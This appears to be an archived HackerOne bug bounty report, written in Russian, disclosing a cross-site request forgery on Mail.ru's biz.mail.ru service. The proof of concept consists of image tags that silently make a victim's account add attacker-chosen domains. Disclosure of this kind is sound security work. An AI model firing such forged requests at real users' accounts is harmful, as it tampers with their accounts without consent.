@@ -1,0 +1,30 @@
+ReportLink:https://hackerone.com/reports/290023
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/c37hun
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:none
+State:Closed
+DateOfDisclosure:16.07.2018 15:40:57
+
+Summary:
+
+Здравствуйте,
+Я обнаружил CSRF на biz.mail.ru
+
+PoC:
+><img src="https://biz.mail.ru/verify/testtest111.com?edu" />
+<img src="https://biz.mail.ru/verify/testtest112.com?edu" />
+<img src="https://biz.mail.ru/verify/testtest113.com?edu" />
+<img src="https://biz.mail.ru/verify/testtest114.com?edu" />
+
+система думает что мы хотели добавить эти домены в свой аккаунт
+через час мы получим майли:
+"Нужна помощь с подтверждением домена *.com?"
+F239336
+
+
+
+Благодарю за внимание.
+С уважением,
+Джейхун Джафаров (c37hun)
